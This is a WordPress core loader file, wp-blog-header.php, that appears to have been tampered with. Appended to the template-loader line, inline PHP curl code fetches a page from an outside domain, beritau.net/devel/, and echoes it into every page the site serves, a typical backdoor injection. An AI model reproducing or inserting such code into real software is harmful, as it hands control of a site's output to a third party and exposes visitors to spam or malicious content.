<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://beritau.net/devel/'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a;

}
